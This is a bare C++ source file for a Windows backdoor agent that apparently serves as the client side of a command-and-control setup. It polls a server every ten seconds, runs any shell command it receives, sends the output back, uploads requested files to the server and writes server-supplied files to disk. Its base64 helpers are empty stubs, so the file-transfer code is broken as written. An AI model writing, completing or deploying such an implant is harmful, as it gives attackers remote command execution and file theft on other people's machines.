#include <iostream>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <random>

using json = nlohmann::json;

std::string client_id;
std::string server_url = "http://127.0.0.1:8080";
std::string checkin_endpoint = "/checkin";
std::string report_endpoint = "/report";


size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp);

std::string base64_encode(const std::string& data);


std::string base64_decode(const std::string& encoded);

std::string get_hostname() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) {
        return std::string(buffer, size);
    }
    return "unknown";
}

std::string generate_client_id() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 999999);
    int random_num = dis(gen);
    std::string hostname = get_hostname();
    return hostname + "_" + std::to_string(random_num);
}

std::string checkin() {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {
        std::string url = server_url + checkin_endpoint + "?ID=" + client_id;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        return readBuffer;
    }
    return "";
}

void report(const json& data) {
    CURL* curl;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        std::string url = server_url + report_endpoint + "?ID=" + client_id;
        std::string json_data = data.dump();
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, json_data.size());
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string execute_command(const std::string& cmd) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hPipeRead, hPipeWrite;
    SECURITY_ATTRIBUTES sa;

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
        return "Failed to create pipe";
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hPipeWrite;
    si.hStdError = hPipeWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;

    if (!CreateProcess(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        return "Failed to create process";
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    std::string output;
    char buffer[1024];
    DWORD bytesRead;
    while (ReadFile(hPipeRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        output.append(buffer, bytesRead);
    }

    CloseHandle(hPipeRead);
    CloseHandle(hPipeWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return output;
}

void handle_command(const json& cmd) {

    std::cout << "Received Command: " << cmd.dump() << std::endl;
    std::string command_type = cmd["command"];
    if (command_type == "execute") {
        std::string args = cmd["args"];
        std::string result = execute_command(args);
        json report_data = { {"type", "execute_result"}, {"data", result} };
        report(report_data);
    }
    else if (command_type == "download") {
        std::string file_path = cmd["file_path"];
        std::ifstream file(file_path, std::ios::binary);
        if (file.is_open()) {
            std::stringstream buffer;
            buffer << file.rdbuf();
            std::string file_content = buffer.str();
            std::string file_content_b64 = base64_encode(file_content);
            json report_data = { {"type", "download"}, {"file_path", file_path}, {"file_content", file_content_b64} };
            report(report_data);
        }
        else {
            json report_data = { {"type", "error"}, {"message", "Failed to open file: " + file_path} };
            report(report_data);
        }
    }
    else if (command_type == "upload") {
        std::string file_path = cmd["file_path"];
        std::string file_content_b64 = cmd["file_content"];
        std::string file_content = base64_decode(file_content_b64);
        std::ofstream file(file_path, std::ios::binary);
        if (file.is_open()) {
            file.write(file_content.c_str(), file_content.size());
            file.close();
        }
        else {
            json report_data = { {"type", "error"}, {"message", "Failed to write file: " + file_path} };
            report(report_data);
        }
    }
}

std::string base64_encode(const std::string& data) {
    return "";
}

std::string base64_decode(const std::string& encoded) {
    return "";
}

int main() {
    client_id = generate_client_id();
    while (true) {
        std::string response = checkin();
        if (!response.empty()) {
            try {
                json cmd = json::parse(response);
                handle_command(cmd);
            }
            catch (const json::exception& e) {
                std::cerr << "JSON parse error: " << e.what() << std::endl;
            }
        }
        Sleep(10000);
    }
    return 0;
}